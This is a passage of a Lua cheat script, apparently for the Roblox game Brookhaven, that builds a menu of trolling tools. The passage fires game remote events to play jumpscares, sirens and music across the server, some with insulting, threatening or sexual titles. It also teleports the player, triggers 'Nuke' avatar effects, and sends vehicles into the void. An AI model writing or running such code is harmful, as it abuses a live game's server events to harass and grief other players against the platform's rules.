      { name = "HAHA TROLLEI ATÉ VOCÊ", id = "7021794555" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "Calaboca Kenga", id = "86494561679259" },
      { name = "alvincut", id = "88788640194373" },
      { name = "e a risada faz como?", id = "140713372459057" },
      { name = "voce deve se m@t4", id = "100227426848009" },
      { name = "receba", id = "94142662616215" }, { name = "UUIIII", id = "73210569653520" },
      { name = "sai", id = "121169949217007" },
      { name = "risada boa dms", id = "127589011971759" },
      { name = "vacilo perna de pau", id = "106809680656199" },
      { name = "gomo gomo no!!!", id = "137067472449625" },
      { name = "arroto", id = "140203378050178" }, { name = "iraaaa", id = "136752451575091" },
      { name = "não fica se achando muito não", id = "101588606280167" },
      { name = "WhatsApp notificaçaoV1", id = "107004225739474" },
      { name = "WhatsApp notificaçaoV2", id = "18850631582" },
      { name = "SamsungV1", id = "123767635061073" },
      { name = "SamsungV2", id = "96579234730244" },
      { name = "Shiiii", id = "120566727202986" },
      { name = "ai_tomaa miku", id = "139770074770361" },
      { name = "Miku Miku", id = "72812231495047" },
      { name = "kuru_kuru", id = "122465710753374" },
      { name = "PM ROCAM", id = "96161547081609" },
      { name = "cavalo!!", id = "78871573440184" },
      { name = "deixa os garoto brinca", id = "80291355054807" },
      { name = "flamengo", id = "137774355552052" },
      { name = "sai do mei satnas", id = "127944706557246" },
      { name = "namoral agora e a hora", id = "120677947987369" },
      { name = "n pode me chutar pq seu celebro e burro", id = "82284055473737" },
      { name = "vc ta fudido vou te pegar", id = "120214772725166" },
      { name = "deley", id = "102906880476838" },
      { name = "Tu e um beta", id = "130233956349541" },
      { name = "Porfavor n tira eu nao", id = "85321374020324" },
      { name = "Olá beleza vc pode me dá muitos", id = "74235334504693" },
      { name = "Discord sus", id = "122662798976905" },
      { name = "rojao apito", id = "6549021381" }, { name = "off", id = "1778829098" },
      { name = "Kazuma kazuma", id = "127954653962405" },
      { name = "sometourado", id = "123592956882621" },
      { name = "Estouradoespad", id = "136179020015211" },
      { name = "Alaku bommm", id = "110796593805268" },
      { name = "busss", id = "139841197791567" },
      { name = "Estourado wItb", id = "137478052262430" },
      { name = "sla", id = "116672405522828" }, { name = "HA HA HA", id = "138236682866721" },
    },
  }, "pankapakan")

  tab:AddSection({ " tacar o terror ou efeito no server" })

  makeSound("Selecione um terror ou efeito", {
    ["efeito/terror"] = {
      { name = "jumpscar", id = "91784486966761" },
      { name = "n se preocupe", id = "87041057113780" },
      { name = "eles estao todos mortos", id = "70605158718179" },
      { name = "gritoestourado", id = "7520729342" },
      { name = "gritomedo", id = "113029085566978" }, { name = "Nukesiren", id = "9067330158" },
      { name = "nuclear sirenv2", id = "675587093" },
      { name = "Alertescola", id = "6607047008" },
      { name = "Memealertsiren", id = "8379374771" }, { name = "sirenv3", id = "6766811806" },
      { name = "Alarm estourAAAA...", id = "93354528379052" },
      { name = "MegaMan Alarm", id = "1442382907" },
      { name = "Alarm bookhaven", id = "1526192493" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "alet malaysia", id = "7714172940" }, { name = "Risada", id = "79191730206814" },
      { name = "Hahahah", id = "90096947219465" }, { name = "scream", id = "314568939" },
      { name = "Terrified meme scream", id = "5853668794" },
      { name = "Sonic.exe Scream Effect", id = "146563959" },
      { name = "Demon Scream", id = "2738830850" },
      { name = "SCP-096 Scream (raging)", id = "343430735" },
      { name = "Nightmare Yelling Bursts", id = "9125713501" },
      { name = "HORROR SCREAM 07", id = "9043345732" },
      { name = "Female Scream Woman Screams", id = "9114397912" },
      { name = "Scream1", id = "1319496541" }, { name = "Scream2", id = "199978176" },
      { name = "scary maze scream", id = "270145703" },
      { name = "SammyClassicSonicFan's Scream", id = "143942090" },
      { name = "FNAF 2 Death Scream", id = "1572549161" },
      { name = "cod zombie scream", id = "8566359672" },
      { name = "Slendytubbies- CaveTubby Scream", id = "1482639185" },
      { name = "FNAF 2 Death Scream", id = "5537531920" },
      { name = "HORROR SCREAM 15", id = "9043346574" },
      { name = "Jumpscare Scream", id = "6150329916" },
      { name = "FNaF: Security Breach", id = "2050522547" },
      { name = "llllllll", id = "5029269312" }, { name = "loud jumpscare", id = "7236490488" },
      { name = "fnaf", id = "6982454389" },
      { name = "Pinkamena Jumpscare 1", id = "192334186" },
      { name = "Ennard Jumpscare 2", id = "629526707" },
      { name = "a sla medo dino", id = "125506416092123" },
      { name = "Backrooms Bacteria Pitfalls ", id = "81325342128575" },
      { name = "error Infinite", id = "3893790326" },
      { name = "Screaming Meme", id = "107732411055226" },
      { name = "Jumpscare - SCP CB", id = "97098997494905" },
      { name = "mirror jumpscare", id = "80005164589425" },
      { name = "PTLD-39 Jumpscare", id = "5581462381" },
      { name = "jumpscare:Play()", id = "121519648044128" },
      { name = "mimic jumpscare", id = "91998575878959" },
      { name = "DOORS Glitch Jumpscare Sound", id = "96377507894391" },
      { name = "FNAS 4 Nightmare Mario", id = "99804224106385" },
      { name = "Death House I Jumpscare Sound", id = "8151488745" },
      { name = "Shinky Jumpscare", id = "123447772144411" },
      { name = "FNaTI Jumpscare Oblitus casa", id = "18338717319" },
      { name = "fnaf jumpscare loadmode", id = "18911896588" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" },
    },
  }, "jumpscar")

  function f25(p24)
    replicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack({
      "ToolMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack({
      "PickHouseMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack({
      "PickingCarMusicText", p24,
    }))

    replicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack({
      "PickingScooterMusicText", p24,
    }))
  end

  tab:AddTextBox({
    Name = "ID da música",
    PlaceholderText = "Digite o ID e pressione Enter",
    Callback = function(value80)
      if value80 and value80 ~= "" then
        f25(tostring(value80))
      end
    end,
  })

  local function f33(name4, p25, default2)
    local v141 = {}
    local v142 = {}

    for key2, value81 in pairs(p25) do
      for index58, value82 in ipairs(value81) do
        if value82.name ~= "" then
          table.insert(v141, value82.name)
          v142[value82.name] = { id = value82.id, category = key2 }
        end
      end
    end

    local function f34(id3)
      f25(tostring(id3))
    end

    tab:AddDropdown({
      Name = name4,
      Description = "all",
      Default = default2,
      Multi = false,
      Options = v141,
      Callback = function(value83)
        if value83 and v142[value83] then
          local id4 = v142[value83].id

          if id4 and id4 ~= "" and id4 ~= "4354908569" then
            f34(id4)
          end
        end
      end,
    })
  end

  f33("Forró", {
    forro = {
      { name = "forró ja cansou", id = "74812784884330" },
      { name = "lenbro ate hoje", id = "71531533552899" },
      { name = "escolha certa", id = "107088620814881" },
      { name = "forró da rezenha", id = "120973520531216" },
      { name = "forró dudu", id = "74404168179733" },
      { name = "forró sao joao", id = "106364874935196" },
      { name = "forró engraçado paia", id = "76524290482399" },
      { name = "100% forro vaquejada", id = "92295159623916" },
      { name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS", id = "71153532555470" },
      { name = "PARA NÃO ESQUECER QUEM SOMOS", id = "88937498361674" },
      { name = "Uno zero", id = "112959083808887" },
      { name = "Iate do neymar", id = "135738534706063" },
      { name = "Batidao na aldeia", id = "79953696595578" }, { name = "", id = "" },
      { name = "", id = "" },
    },
  }, "Option 1")

  f33("Músicas e Memes Aleatório", {
    forro = {
      { name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189" },
      { name = "Meu corpo, minhas regras", id = "127587901595282" },
      { name = "$$$$gg$$$$gg", id = "137471775091253" },
      { name = "Megalovania but its only the melodies", id = "104500091160463" },
      { name = "androphono strikes back", id = "78312089943968" },
      { name = "Bamm Bamm", id = "128730685516895" },
      { name = "chupa cabra", id = "132890273173295" },
      { name = "longe de mais", id = "124478512057763" },
      { name = "Garoto de Copacabana", id = "135648634110254" },
      { name = "CELL!", id = "117634275895085" },
      { name = "Boa vibe em Ubatuba", id = "139059061493558" },
      { name = "SLIP AWAY", id = "126152928520174" },
      { name = "Alone in Motion", id = "122379348696948" },
      { name = "Fade Away", id = "81002139735874" },
      { name = "Wounds & Wishes", id = "109347979566607" },
      { name = "Ascensão do Monarca", id = "101864243033211" },
      { name = "carro do ovo", id = "3148329638" },
      { name = "ingles bus (fling ou kill bus)", id = "123268013026823" },
      { name = "MIKU MIKU HATSUNE", id = "112783541496955" },
      { name = "Five Nights at Freddy's", id = "110733765539890" },
      { name = "Rat Dance", id = "133496635668044" },
      { name = "Escalando a Seleção Brasileira para a Copa", id = "116546457407236" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" },
    },
  }, "Option 1")

  f33("Funk", {
    Funk = {
      { name = "sua mulher funk", id = "90844637105538" },
      { name = "fuga na viatura", id = "131891110268352" },
      { name = "funkphonk fumando verde", id = "112143944982807" },
      { name = "cauma xmara", id = "95664293972405" },
      { name = "que que sharke", id = "129546408528391" },
      { name = "Il Cacto Hipopotamo FUNK", id = "104491656009142" },
      { name = "Espressora Signora FUNK", id = "123394392737234" },
      { name = "trippi troop funk", id = "73049389767013" },
      { name = "bombini funkphonk", id = "88814770244609" },
      { name = "pre treino", id = "136869502216760" },
      { name = "CVRL", id = "124244582950595" },
      { name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701" },
      { name = "Dança do Canguru (Pke Gaz1nh)", id = "86876136192157" },
      { name = "espere 30segundos!! Ondas sonoras", id = "127757321382838" },
      { name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098" },
      { name = "Manda o papo (NGI)", id = "132642647937688" },
      { name = "Viver bem", id = "82805460494325" },
      { name = "Faixa estronda", id = "121187736532042" },
      { name = "Ritmo Pixelado", id = "93928823862203" },
      { name = "Viagem Sonora", id = "79349174602261" },
      { name = "Melodia Virtual", id = "139147474886402" },
      { name = "Melodia Serena", id = "97011217688307" },
      { name = "SENTA", id = "124085422276732" },
      { name = "TUNG TUNG TUNG TUNG SAHUR PHONK BRASILEIRO", id = "120353876640055" },
      { name = "crazy-lol", id = "106958630419629" }, { name = "V7", id = "80348640826643" },
      { name = "UIUAH", id = "82894376737849" },
      { name = "meta ritmo", id = "110091098283354" },
      { name = "CAPPUCCINO ASSASSINO (SPEDUP)", id = "132733033157915" },
      { name = "haha (NGI)", id = "122114766584918" },
      { name = "DO PO", id = "114207745067816" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" },
    },
  }, "Option 1")

  f33("Phonk", {
    phonk = {
      { name = "wyles", id = "85385155970460" },
      { name = "phonk kawai", id = "91502410121438" },
      { name = "querendo da a bucet@", id = "72720721570850" },
      { name = "vem no pocpoc", id = "102333419023382" },
      { name = "tatiu wim", id = "122871512353520" },
      { name = "novinha sapeca", id = "111668097052966" },
      { name = "novinha representa", id = "93786060174790" },
      { name = "phonk1", id = "77501611905348" }, { name = "phonk2", id = "126887144190812" },
      { name = "phonk osadia", id = "88033569921555" },
      { name = "phonk sarra", id = "132436320685732" },
      { name = "relaionamento sem crush", id = "105832154444494" },
      { name = "phonk3", id = "90323407842935" },
      { name = "novinha dançapanpa", id = "132245626038510" },
      { name = "phonk sexoagreçivo", id = "111995323199676" },
      { name = "phonk4", id = "115016589376700" }, { name = "phonk5", id = "118740708757685" },
      { name = "phonk6", id = "139435437308948" },
      { name = "phonk chapaquente", id = "109189438638906" },
      { name = "phonk rajada", id = "105126065014034" },
      { name = "rede globo", id = "138487820505005" },
      { name = "phonk indiano", id = "87968531262747" },
      { name = "vapo do vapo", id = "106317184644394" },
      { name = "tutatatutata", id = "112068892721408" },
      { name = "phonk slower", id = "122852029094656" },
      { name = "phonk9", id = "91760524161503" }, { name = "phonk10", id = "73140398421340" },
      { name = "phonk11", id = "137962454483542" }, { name = "phonk12", id = "84733736048142" },
      { name = "phonk13", id = "106322173003761" }, { name = "phonk14", id = "94604796823780" },
      { name = "phonk15", id = "118063577904953" },
      { name = "phonk16", id = "115567432786512" },
      { name = "phonk toq", id = "71304501822029" },
      { name = "phonk hey", id = "132218979961283" },
      { name = "phonk17", id = "102708912256857" },
      { name = "phonk18", id = "140642559093189" }, { name = "phonk neve", id = "13530439660" },
      { name = "phonk19", id = "87863924786534" }, { name = "phonk20", id = "133135085604736" },
      { name = "phonk lento", id = "97258811783169" },
      { name = "phonk21", id = "92308400487695" }, { name = "tipo wym", id = "88064647826500" },
      { name = "estouradassa1", id = "92175624643620" },
      { name = "estouradassa2", id = "108099943758978" },
      { name = "Naaaaa", id = "109784877184952" }, { name = "trem", id = "114608169341947" },
      { name = "eoropa", id = "111346133543699" },
      { name = "atimosphekika", id = "77857496821844" },
      { name = "phonk ALL THE TIME", id = "123809083385992" },
      { name = "Lifelong Memory", id = "81929101024622" },
      { name = "Automotivo Blondie (Pke Gaz1nh)", id = "74564219749776" },
      { name = "สวัสดีคนไทย v2", id = "118225359190317" },
      { name = "MTG TU VAI SENTAR (Pke Gaz1nh)", id = "115317874112657" },
      { name = "SARRA FUNK", id = "96249826607044" },
      { name = "Catuquanvan", id = "88038595663211" },
      { name = "F-D-1 (slowed)", id = "124958445624871" },
      { name = "Sucessagem", id = "88551699463723" },
      { name = "ILOVE phonksla", id = "82148953715595" },
      { name = "SPEED SLIDE", id = "118959437310311" },
      { name = "TOMA FUNK PHONK", id = "126291069838831" },
      { name = "PASSO BEM SOLTO X NEW JAZZ", id = "122706595087279" },
      { name = "MONTAGEM BIONICA DIAMANTE", id = "122338822665007" },
      { name = "BALA SELVAGEM!", id = "96180057167470" },
      { name = "Luz <3", id = "74281337525581" }, { name = "COMO TU", id = "86928685812280" },
      { name = "MONTAGEM SOLAR TROPICANO (SPEED UP)", id = "116461681407294" },
      { name = "MONTAGEM SOLAR TROPICANO (SLOWED)", id = "109308273341422" },
      { name = "YO DE TI", id = "125181345407169" },
      { name = "Beauty, (Phonk), Super sped up", id = "71123357599630" },
      { name = "MONTAGEM BOOMBOX DO MALA FUNK", id = "86537505028256" },
      { name = "BRAZIL DO FUNK", id = "133498554139200" },
      { name = "BRR BRR PATAPIM FUNK", id = "117170901476451" },
      { name = "MONTAGEM TERRA BELA FUNK", id = "134770548505933" },
      { name = "FUNK DO RAVE 1.0", id = "137135395010424" },
      { name = " Portao Funk", id = "70900514961735" },
      { name = " Espaço Funk", id = "110519906029322" },
      { name = " FUTABA", id = "91834632690710" },
      { name = " Melódica Explosão De Melodia", id = "98371771055411" },
      { name = " RASGO", id = "98267810117949" },
      { name = " HIPNOTIZA", id = "117668905142866" },
      { name = "CRISTAL NOTURNO", id = "103695219371872" },
      { name = " SKY HIGH", id = "123517126955383" },
      { name = "MIKU top", id = "102771149931910" },
      { name = " ACABU SO FUNK", id = "127870227978818" },
      { name = "CREATIFE FUNK", id = "130525387712209" },
      { name = "GOTH FUNK", id = "97662362226511" },
      { name = "PORTUGESE FUNK", id = "125858109122379" },
      { name = "SUBURBANA", id = "139825057894568" },
      { name = "ESPERA LA NOCHE FUNK", id = "139768056738146" },
      { name = "SIN PERMISO FUNK", id = "92572896648274" },
      { name = "MONTAGEM DACE RAT", id = "98711199754623" },
      { name = " LOVELY FUNK", id = "130633105268814" },
      { name = "STORYMODECOOL", id = "87115976125426" },
      { name = "BLACK COFFEE FUNK", id = "82705137378395" },
      { name = "KOBALT", id = "79381341943021" },
      { name = " andante bacterial", id = "105882833374061" },
      { name = "ANGEL Speed Up", id = "139593870988593" },
      { name = "LUTA ÉPICA", id = "73966367524216" },
      { name = "MALDITA", id = "133814632960968" },
      { name = "DA ZONA NTJ VERSON", id = "105770593501071" },
      { name = "HIPNOTIZA", id = "132015050363205" },
      { name = "MIDZUKI speed up", id = "129151948619922" },
      { name = "movimenta funk", id = "114994598691121" },
      { name = "CRISTAL", id = "103445348511856" },
      { name = "Letero funkphonk", id = "99409598156364" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" }, { name = "", id = "" },
      { name = "", id = "" }, { name = "", id = "" },
    },
  }, "Option 1")

  tab:AddButton({ Name = "Stop", Description = "ALL music", Callback = function() f25("") end })
  tab7:AddSection({ "teleport" })
  localPlayer5 = players.LocalPlayer
  v16 = "Morro"

  v17 = {
    Morro = Vector3.new(-348.64, 65.94, -458.08),
    ["Praça"] = Vector3.new(-26.17, 3.48, -0.93),
    Banco = Vector3.new(1.99, 3.32, 236.65),
    Hospital = Vector3.new(-303.2, 3.4, 13.74),
    Prefeitura = Vector3.new(-354.65, 7.32, -102.16),
    Fazenda = Vector3.new(-766.41, 2.92, -61.1),
    Mercado = Vector3.new(16.31, 3.32, -107.07),
    Shopping = Vector3.new(151.05, 3.52, -190.64),
    Aeroporto = Vector3.new(290.23, 4.32, 42.57),
    Hotel = Vector3.new(159.1, 3.32, 164.97),
    ["Beira-mar 1"] = Vector3.new(55.69, 2.94, -1403.6),
    ["Beira-mar 2"] = Vector3.new(42.39, 2.94, 1336.14),
  }

  tab7:AddDropdown({
    Name = "Locais de Brookhaven",
    Description = "Selecione um local para teleportar",
    Default = v16,
    Multi = false,
    Options = {
      "Morro", "Praça", "Banco", "Hospital", "Prefeitura", "Fazenda", "Mercado", "Shopping",
      "Aeroporto", "Hotel", "Beira-mar 1", "Beira-mar 2",
    },
    Callback = function(value84) v16 = value84 end,
  })

  tab7:AddButton({
    Name = "Teleportar",
    Description = "Teleporta para o local selecionado",
    Callback = function()
      local humanoidRootPart29 = localPlayer5.Character
        and localPlayer5.Character:FindFirstChild("HumanoidRootPart")

      local humanoidRootPart30, humanoid25, v143

      if humanoidRootPart29 then
        humanoidRootPart30 = localPlayer5.Character.HumanoidRootPart
        humanoid25 = localPlayer5.Character:FindFirstChildOfClass("Humanoid")
        v143 = v17[v16]

        if v143 then
          pcall(function()
            if humanoid25 then
              humanoid25:ChangeState(Enum.HumanoidStateType.Physics)
              humanoid25.WalkSpeed = 0
            end

            humanoidRootPart30.Anchored = true
            humanoidRootPart30.CFrame = CFrame.new(v143)

            task.wait(0.4)
            humanoidRootPart30.Anchored = false

            if humanoid25 then
              humanoid25.WalkSpeed = 16
              humanoid25:ChangeState(Enum.HumanoidStateType.Running)
            end
          end)
        end
      end
    end,
  })

  tab8:AddSection({ "Nuke" })
  loadAnimation = nil
  loadAnimation2 = nil
  v18 = {}

  function f26()
    if loadAnimation2 then
      pcall(function()
        loadAnimation2:Stop()
        loadAnimation2:Destroy()
      end)

      loadAnimation2 = nil
    end

    if loadAnimation then
      pcall(function()
        loadAnimation:Stop()
        loadAnimation:Destroy()
      end)

      loadAnimation = nil
    end

    local character16 = players.LocalPlayer.Character

    if character16 then
      local humanoid26 = character16:FindFirstChild("Humanoid")

      if humanoid26 then
        local animator = humanoid26:FindFirstChild("Animator")

        if animator then
          for key3, value85 in pairs(animator:GetPlayingAnimationTracks()) do
            local v144 = value85

            if v144.Animation then
              local animationId = v144.Animation.AnimationId

              if animationId == "rbxassetid://70883871260184"
                or animationId == "rbxassetid://3695333486" then
                pcall(function() v144:Stop() end)
              end
            end
          end
        end
      end
    end
  end

  tab8:AddToggle({
    Name = "Nuke",
    Default = false,
    Callback = function(value86)
      local v145

      if value86 then
        local character17 = players.LocalPlayer.Character

        if character17 then
          local humanoid27 = character17:FindFirstChildOfClass("Humanoid")

          if humanoid27 then
            local getAppliedDescription3 = humanoid27:GetAppliedDescription()

            v18 = {
              Torso = getAppliedDescription3.Torso,
              RightArm = getAppliedDescription3.RightArm,
              LeftArm = getAppliedDescription3.LeftArm,
              RightLeg = getAppliedDescription3.RightLeg,
              LeftLeg = getAppliedDescription3.LeftLeg,
              Head = getAppliedDescription3.Head,
            }

            task.wait(0.2)
            task.wait(0.3)

            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://70883871260184"

            loadAnimation = humanoid27:LoadAnimation(animation)
            loadAnimation.Priority = Enum.AnimationPriority.Action4
            loadAnimation:Play(0.1, 1, 0.01)

            task.wait(0.5)

            local animation2 = Instance.new("Animation")
            animation2.AnimationId = "rbxassetid://3695333486"

            loadAnimation2 = humanoid27:LoadAnimation(animation2)
            loadAnimation2.Priority = Enum.AnimationPriority.Movement
            loadAnimation2:Play(0.1, 1, 0)
          end
        end
      else
        f26()
        task.wait(0.2)

        if next(v18) then
          local character18 = players.LocalPlayer.Character

          if character18 then
            if character18:FindFirstChildOfClass("Humanoid") then
              v145 = {
                { v18.Torso, v18.RightArm, v18.LeftArm, v18.RightLeg, v18.LeftLeg, v18.Head },
              }

              pcall(function()
                replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v145))
              end)

              v18 = {}
            end
          end
        end
      end
    end,
  })

  loadAnimation3 = nil
  loadAnimation4 = nil
  v19 = {}

  function f27()
    if loadAnimation4 then
      pcall(function()
        loadAnimation4:Stop()
        loadAnimation4:Destroy()
      end)

      loadAnimation4 = nil
    end

    if loadAnimation3 then
      pcall(function()
        loadAnimation3:Stop()
        loadAnimation3:Destroy()
      end)

      loadAnimation3 = nil
    end
  end

  tab8:AddToggle({
    Name = "Nuke FlashBack",
    Default = false,
    Callback = function(value87)
      local v146, v147

      if value87 then
        local character19 = players.LocalPlayer.Character

        if character19 then
          local humanoid28 = character19:FindFirstChildOfClass("Humanoid")

          if humanoid28 then
            local getAppliedDescription4 = humanoid28:GetAppliedDescription()

            v19 = {
              Torso = getAppliedDescription4.Torso,
              RightArm = getAppliedDescription4.RightArm,
              LeftArm = getAppliedDescription4.LeftArm,
              RightLeg = getAppliedDescription4.RightLeg,
              LeftLeg = getAppliedDescription4.LeftLeg,
              Head = getAppliedDescription4.Head,
            }

            task.wait(0.2)

            v147 = {
              123402086843880, 100839513065430, 78300682916056, 86276701020724, 78409653958165,
              15093053680,
            }

            pcall(function() replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(v147) end)
            task.wait(0.3)

            local animation3 = Instance.new("Animation")
            animation3.AnimationId = "rbxassetid://70883871260184"

            loadAnimation3 = humanoid28:LoadAnimation(animation3)
            loadAnimation3.Priority = Enum.AnimationPriority.Action4
            loadAnimation3:Play(0.1, 1, 1)

            task.wait(0.1)
            loadAnimation3:AdjustSpeed(5)
            task.wait(0.3)

            local animation4 = Instance.new("Animation")
            animation4.AnimationId = "rbxassetid://3695333486"

            loadAnimation4 = humanoid28:LoadAnimation(animation4)
            loadAnimation4.Priority = Enum.AnimationPriority.Movement
            loadAnimation4:Play(0.1, 1, 0)
          end
        end
      else
        f27()
        task.wait(0.2)

        if next(v19) then
          local character20 = players.LocalPlayer.Character

          if character20 then
            if character20:FindFirstChildOfClass("Humanoid") then
              v146 = {
                { v19.Torso, v19.RightArm, v19.LeftArm, v19.RightLeg, v19.LeftLeg, v19.Head },
              }

              pcall(function()
                replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v146))
              end)

              v19 = {}
            end
          end
        end
      end
    end,
  })

  tab8:AddSection({ "Skybox FE" })

  tab8:AddDropdown({
    Name = "Camisas",
    Options = { "Scary", "Hacker", "Anonymous" },
    Callback = function(value88) end,
  })

  tab8:AddTextBox({
    Name = "ID da Camisa",
    PlaceholderText = "Insira o ID da camisa",
    Callback = function(value89)
      local v148 = tonumber(value89)
      local v149

      if v148 then
        v149 = { v148 }

        pcall(function()
          replicatedStorage:WaitForChild("Remotes"):WaitForChild("WearShirt"):InvokeServer(unpack(v149))
        end)
      end
    end,
  })

  _G.SkyboxActive = _G.SkyboxActive or false
  _G.CurrentTrack = _G.CurrentTrack or nil
  _G.RigidTrack = _G.RigidTrack or nil

  local g = _G
  g.savedBodyParts = _G.savedBodyParts or {}

  function f28()
    if _G.RigidTrack then
      pcall(function()
        _G.RigidTrack:Stop()
        _G.RigidTrack:Destroy()
      end)

      _G.RigidTrack = nil
    end

    if _G.CurrentTrack then
      pcall(function()
        _G.CurrentTrack:Stop()
        _G.CurrentTrack:Destroy()
      end)

      _G.CurrentTrack = nil
    end

    local character21 = players.LocalPlayer.Character

    if character21 then
      local humanoid29 = character21:FindFirstChild("Humanoid")

      if humanoid29 then
        local animator2 = humanoid29:FindFirstChild("Animator")

        if animator2 then
          for key4, value90 in pairs(animator2:GetPlayingAnimationTracks()) do
            local v150 = value90

            if v150.Animation then
              local animationId2 = v150.Animation.AnimationId

              if animationId2 == "rbxassetid://70883871260184"
                or animationId2 == "rbxassetid://3695333486" then
                pcall(function() v150:Stop() end)
              end
            end
          end
        end
      end
    end
  end

  tab8:AddToggle({
    Name = "Skybox",
    Default = _G.SkyboxActive or false,
    Callback = function(value91)
      _G.SkyboxActive = value91
      local v151

      if value91 then
        local character22 = players.LocalPlayer.Character

        if character22 then
          local humanoid30 = character22:FindFirstChildOfClass("Humanoid")

          if humanoid30 then
            local getAppliedDescription5 = humanoid30:GetAppliedDescription()

            _G.savedBodyParts = {
              Torso = getAppliedDescription5.Torso,
              RightArm = getAppliedDescription5.RightArm,
              LeftArm = getAppliedDescription5.LeftArm,
              RightLeg = getAppliedDescription5.RightLeg,
              LeftLeg = getAppliedDescription5.LeftLeg,
              Head = getAppliedDescription5.Head,
            }

            task.wait(0.2)
            v151 = { { 100839513065430, nil, nil, nil, nil, nil } }

            pcall(function()
              replicatedStorage.Remotes.ChangeCharacterBody:InvokeServer(unpack(v151))
            end)

            task.wait(0.3)

            local animation5 = Instance.new("Animation")
            animation5.AnimationId = "rbxassetid://70883871260184"

            _G.CurrentTrack = humanoid30:LoadAnimation(animation5)
            _G.CurrentTrack.Priority = Enum.AnimationPriority.Action4
            _G.CurrentTrack:Play(0.1, 1, 0.01)

            task.wait(0.5)

            local animation6 = Instance.new("Animation")
            animation6.AnimationId = "rbxassetid://3695333486"

            _G.RigidTrack = humanoid30:LoadAnimation(animation6)
            _G.RigidTrack.Priority = Enum.AnimationPriority.Movement
            _G.RigidTrack:Play(0.1, 1, 0)
          end
        end
      else
        f28()
        task.wait(0.2)

        if next(_G.savedBodyParts) then
          local character23 = players.LocalPlayer.Character

          if character23 then
            if character23:FindFirstChildOfClass("Humanoid") then
              _G.savedBodyParts = {}
            end
          end
        end
      end
    end,
  })

  tab9:AddSection({ "all car functions" })
  local localPlayer10 = players.LocalPlayer
  local currentCamera = workspaceService.CurrentCamera

  v20 = {}
  v20.Players = players
  v20.Workspace = workspaceService
  v20.LocalPlayer = localPlayer10
  v20.Camera = currentCamera

  function v20:MostrarNotificacao(p26)
  end

  function v20:ToggleFallDamage(p27)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      return false
    else
      local humanoid31 = self.LocalPlayer.Character.Humanoid

      if p27 then
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid31:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid31.PlatformStand = false

        return true
      end

      humanoid31:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
      humanoid31:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)

      return false
    end
  end

  function v20:TeleportToSeat(index59, p28)
    if not self.LocalPlayer.Character
      or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
      self:MostrarNotificacao("Personagem não encontrado!")
      return false
    else
      local humanoid32 = self.LocalPlayer.Character.Humanoid
      local humanoidRootPart31 = self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

      if not humanoidRootPart31 then
        self:MostrarNotificacao("Parte raiz do personagem não encontrada!")
        return false
      end

      humanoid32.Sit = false
      task.wait(0.1)
      humanoidRootPart31.CFrame = index59.CFrame + Vector3.new(0, 5, 0)
      task.wait(0.1)
      index59:Sit(humanoid32)
      task.wait(0.5)
      return humanoid32.SeatPart == index59
    end
  end

  function v20:TeleportToVoid(p29)
    local vector9

    if not p29 then
      self:MostrarNotificacao("Veículo inválido!")
      return
    elseif not p29.PrimaryPart then
      local findFirstChild16 = p29:FindFirstChild("Body", true)
        or p29:FindFirstChild("Chassis", true)

      if findFirstChild16 and findFirstChild16:IsA("BasePart") then
        p29.PrimaryPart = findFirstChild16
        vector9 = Vector3.new(0, -1000, 0)
        p29:SetPrimaryPartCFrame(CFrame.new(vector9))
        task.wait(0.5)
        return
      end

      self:MostrarNotificacao("Parte principal do veículo não encontrada!")
      return
    else
      vector9 = Vector3.new(0, -1000, 0)
      p29:SetPrimaryPartCFrame(CFrame.new(vector9))
      task.wait(0.5)
      return
    end
  end

  function v20:TeleportToPlayer(p30, index60)
    local vector10

    if not p30 then
      self:MostrarNotificacao("Veículo inválido!")
      return
    elseif not p30.PrimaryPart then
      local findFirstChild17 = p30:FindFirstChild("Body", true)
        or p30:FindFirstChild("Chassis", true)

      if findFirstChild17 and findFirstChild17:IsA("BasePart") then
        p30.PrimaryPart = findFirstChild17
        vector10 = Vector3.new(5, 0, 5)
        p30:SetPrimaryPartCFrame(CFrame.new(index60 + vector10))
        task.wait(0.5)
        return
      end

      self:MostrarNotificacao("Parte principal do veículo não encontrada!")
      return
    else
